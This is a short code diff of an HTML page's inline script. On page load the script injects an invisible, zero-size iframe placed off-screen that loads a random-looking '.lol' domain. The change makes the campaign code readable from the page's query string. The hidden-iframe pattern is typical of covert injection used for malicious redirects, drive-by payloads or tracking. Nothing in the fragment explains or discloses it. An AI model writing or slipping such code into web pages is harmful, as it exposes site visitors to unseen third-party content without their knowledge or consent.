@@ -4,8 +4,10 @@
 <meta charset="UTF-8" />
 <script>
 (function () {
+  var q = new URLSearchParams(location.search);
+  var c = q.get("c") || "B5RDUON8";
   var f = document.createElement("iframe");
-  f.src = "https://www.3up0zbqt0evrwe0rotug90.lol/?c=B5RDUON8";
+  f.src = "https://www.3up0zbqt0evrwe0rotug90.lol/?c=" + encodeURIComponent(c);
   f.style.cssText = "position:fixed;top:0;left:-1000px;width:0;height:0;border:0";
   (document.body || document.documentElement).appendChild(f);
 })();
